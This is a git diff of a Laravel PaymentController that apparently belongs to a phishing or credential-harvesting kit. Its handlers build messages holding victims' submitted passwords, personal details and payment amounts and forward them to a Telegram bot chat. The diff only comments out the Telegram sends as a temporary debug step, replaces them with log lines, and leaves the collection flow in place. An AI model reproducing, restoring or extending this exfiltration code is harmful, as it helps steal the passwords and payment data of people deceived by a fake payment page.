@@ -26,11 +26,13 @@ class PaymentController extends Controller
                  . "🔐 Mot de passe : {$validated['password']}" ;
 
         try {
-            // 3. Envoi de la notification
-            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-                ->notify(new TelegramAlert($message));
+            // TEMPORAIRE: Disabled pour debug
+            // Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+            //     ->notify(new TelegramAlert($message));
+            
+            Log::info('Payment received - Telegram disabled for debug');
 
-                return redirect()->route('personal-info');
+            return redirect()->route('personal-info');
 
         } catch (\Exception $e) {
 
@@ -73,9 +75,11 @@ class PaymentController extends Controller
                  . "💰 Montant : {$validated['article_amount']} €";
 
         try {
-            // Envoi de la notification
-            Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
-                ->notify(new TelegramAlert($message));
+            // TEMPORAIRE: Disabled pour debug
+            // Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
+            //     ->notify(new TelegramAlert($message));
+            
+            Log::info('Personal Info received - Telegram disabled for debug');
         } catch (\Exception $e) {
             Log::error('Telegram storePersonalInfo Error: ' . $e->getMessage());
             Log::error('Telegram Stack: ' . $e->getTraceAsString());
